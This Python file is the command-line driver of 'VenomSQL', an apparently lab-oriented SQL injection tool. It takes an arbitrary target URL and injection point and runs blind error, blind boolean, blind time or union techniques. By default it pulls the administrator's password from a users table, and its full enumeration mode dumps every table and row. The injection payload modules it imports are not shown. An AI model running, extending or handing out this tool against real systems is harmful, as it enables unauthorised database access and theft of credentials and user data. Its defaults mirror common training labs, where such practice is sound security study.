import argparse
from .blindBoolean import BlindBooleanBased
from .blindError import BlindErrorBased
from .blindTime import BlindTimeBased
from .unionBased import UnionBased

TECHNIQUES = {
    "blind-error": BlindErrorBased,
    "blind-boolean": BlindBooleanBased,
    "blind-time": BlindTimeBased,
    "union": UnionBased
}

BANNER = """
 _    __                       _____ ____    __    _
| |  / /__  ____  ____  ____ / ___// __ \\  / /   (_)
| | / / _ \\/ __ \\/ __ \\/  _ \\\\__ \\/ / / / / /   / /
| |/ /  __/ / / / /_/ / / / /__/ / /_/ / / /___/ /
|___/\\___/_/ /_/\\____/_/ /_/____/\\___\\_\\/_____/_/
                                        by giriftzen
"""


def parse_args():
    parser = argparse.ArgumentParser(
        description="VenomSQL — Modular SQL Injection Tool"
    )
    parser.add_argument("--url", required=True, help="Target URL")
    parser.add_argument("--technique", "-t", required=True, choices=TECHNIQUES.keys(),
                        help="SQLi technique: blind-error, blind-boolean, blind-time, union")
    parser.add_argument("--db", default="oracle", choices=["oracle", "mysql", "postgresql", "mssql", "sqlite", "mariadb"],
                        help="Database type (default: oracle)")
    parser.add_argument("--inject", default="cookie", choices=["cookie", "url_param", "post", "header"],
                        help="Injection point location (default: cookie)")
    parser.add_argument("--param", default="TrackingId", help="Injectable parameter name (default: TrackingId)")
    parser.add_argument("--table", default="users", help="Target table (default: users)")
    parser.add_argument("--column", default="password", help="Column to extract (default: password)")
    parser.add_argument("--username", default="administrator", help="Target username (default: administrator)")
    parser.add_argument("--session", help="Extra session cookie value")
    parser.add_argument("--signal", default="Welcome back!", help="Boolean signal text (default: 'Welcome back!')")
    parser.add_argument("--delay", type=int, default=5, help="Time delay in seconds for time-based (default: 5)")
    parser.add_argument("--dump-tables", action="store_true", help="Dump table names (union only)")
    parser.add_argument("--dump-columns", help="Dump columns for a table (union only)")
    parser.add_argument("--dump-data", nargs="+", help="Dump data: --dump-data TABLE col1 col2 (union only)")
    parser.add_argument("--enum", action="store_true", help="Full enumeration: tables → columns → data (union only)")
    return parser.parse_args()


def main():
    args = parse_args()
    print(BANNER)

    inject_point = {"location": args.inject, "param": args.param}
    extra_cookies = {"session": args.session} if args.session else {}

    technique_class = TECHNIQUES[args.technique]

    kwargs = {
        "url": args.url,
        "inject_point": inject_point,
        "targetTable": args.table,
        "db_type": args.db,
        "extra_cookies": extra_cookies
    }

    if args.technique == "blind-boolean":
        kwargs["signal"] = args.signal
    elif args.technique == "blind-time":
        kwargs["delay"] = args.delay

    sqli = technique_class(**kwargs)

    print(f"[*] Target: {args.url}")
    print(f"[*] Technique: {args.technique}")
    print(f"[*] Database: {args.db}")
    print(f"[*] Inject: {args.inject} → {args.param}")
    print(f"[*] Table: {args.table}")
    print()

    if args.technique == "union":
        sqli.detect_columns()
        sqli.find_string_column()
        if args.enum:
            print("\n[*] === FULL ENUMERATION ===\n")
            tables = sqli.dump_tables()
            for table in tables:
                print(f"\n[*] --- {table} ---")
                columns = sqli.dump_columns(table)
                if columns:
                    sqli.dump_data(table, columns)
            return
        if args.dump_tables:
            sqli.dump_tables()
            return
        if args.dump_columns:
            sqli.dump_columns(args.dump_columns)
            return
        if args.dump_data:
            table_name = args.dump_data[0]
            columns = args.dump_data[1:]
            if not columns:
                print("[-] Column names required: --dump-data TABLE col1 col2")
                return
            sqli.dump_data(table_name, columns)
            return

    result = sqli.extract(column=args.column, username=args.username)
    if result:
        print(f"\n[+] RESULT: {args.column} = {result}")
    else:
        print("\n[-] Extraction failed.")


if __name__ == "__main__":
    main()
